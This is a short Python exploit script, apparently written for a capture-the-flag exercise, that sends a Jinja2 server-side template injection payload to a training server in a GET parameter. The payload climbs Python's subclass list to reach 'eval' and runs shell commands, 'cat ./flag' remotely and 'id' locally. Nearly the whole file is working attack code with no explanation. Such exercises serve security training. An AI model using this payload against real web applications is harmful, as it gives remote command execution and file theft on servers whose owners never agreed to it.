import requests
url='http://edu.kaibro.tw:8000'
payload='''
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("cat ./flag").read()') }}
    {% endif %}
  {% endif %}	
  {% endfor %}
{% endif %}
{% endfor %}
'''
for c in [].__class__.__base__.__subclasses__():
	if c.__name__ == 'catch_warnings':
		for b in c.__init__.__globals__.values():
			if b.__class__ == {}.__class__:
				if 'eval' in b.keys():
					b['eval']('__import__("os").popen("id").read()')
# exit()
# payload='''
# {% for c in [].__class__.__base__.__subclasses__() %}
# {% if c.__name__ == 'catch_warnings' %}
#   {% for b in c.__init__.__globals__.values() %}
#   {% endfor %}
# {% endif %}
# {% endfor %}
# '''
print(payload)

payload = {
	'name' : payload
}
res = requests.get(url,params=payload)
data = res.content.decode()
for row in data.split('\n'):
	if row.strip():
		print(row)
